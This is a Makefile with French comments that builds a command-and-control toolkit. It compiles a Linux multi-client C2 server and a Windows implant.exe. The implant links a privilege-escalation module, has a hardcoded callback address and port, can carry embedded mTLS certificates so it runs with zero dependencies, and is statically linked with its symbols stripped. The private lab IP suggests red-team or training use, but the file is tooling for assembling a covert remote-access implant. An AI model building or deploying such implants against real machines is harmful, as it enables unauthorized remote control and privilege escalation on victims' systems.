# Makefile — C2 server (Linux) + implant (Windows/MSYS2)
#
# ── Prérequis ──────────────────────────────────────────────────────────────────
#   C2 Ubuntu : sudo apt install gcc libssl-dev openssl -y
#
# ── Cibles ─────────────────────────────────────────────────────────────────────
#   make server               → c2_server   (Linux, multi-client)
#   make implant              → implant.exe (MSYS2 MINGW64, avec fichiers .env/certs)
#   make implant-standalone   → implant.exe (MSYS2 MINGW64, certs embarqués, zéro dépendance)
#   make embed                → génère embedded_certs.h depuis certs/
#   make certs [C2_IP=…]      → génère les certificats mTLS dans certs/
#   make clean

CC      = gcc
CFLAGS  = -Wall -Wextra
LIBS    = -lssl -lcrypto

C2_IP   ?= 192.168.56.101
C2_PORT ?= 4444

.PHONY: all server implant implant-standalone embed certs clean

all: server

server: c2_server.c tls.c tls.h
	$(CC) $(CFLAGS) -O2 -o c2_server c2_server.c tls.c $(LIBS) -lpthread
	@echo "[+] c2_server compilé (multi-client)"

implant: implant.c tls.c tls.h privesc.c privesc.h
	gcc $(CFLAGS) \
		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe implant.c tls.c privesc.c \
		-lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 \
		-static -s
	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT)) — nécessite .env + certs/"

embed: gen-embed.sh
	bash gen-embed.sh certs
	@echo "[+] embedded_certs.h généré"

implant-standalone: implant.c tls.c tls.h privesc.c privesc.h embedded_certs.h
	gcc $(CFLAGS) \
		-DEMBED_CERTS -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe implant.c tls.c privesc.c \
		-lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 \
		-static -s
	@echo "[+] implant.exe standalone généré ($(C2_IP):$(C2_PORT)) — zéro dépendance"

certs:
	@bash gen-certs.sh $(C2_IP)

clean:
	rm -f c2_server implant.exe implant_debug.exe embedded_certs.h *.o
